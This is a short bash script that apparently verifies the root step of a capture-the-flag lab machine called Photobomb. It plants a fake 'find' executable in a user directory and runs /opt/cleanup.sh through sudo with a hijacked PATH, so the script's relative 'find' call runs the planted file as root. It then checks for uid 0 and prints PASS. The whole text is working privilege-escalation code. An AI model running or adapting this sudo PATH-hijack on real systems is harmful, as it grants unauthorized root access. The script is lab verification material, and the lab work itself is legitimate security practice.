#!/bin/bash
set -euo pipefail
test "$(id -u)" = 1000
test -r /home/wizard/user.txt
test ! -r /root/root.txt
cd /home/wizard/photobomb
cat > find <<'EOF'
#!/bin/sh
/usr/bin/id > /tmp/photobomb-native-root-proof
EOF
chmod 0755 find
sudo -n PATH=/home/wizard/photobomb:/usr/bin:/bin /opt/cleanup.sh
grep -q 'uid=0(root)' /tmp/photobomb-native-root-proof
echo 'PASS: sudo SETENV cleanup.sh -> PATH hijack of relative find -> UID 0'
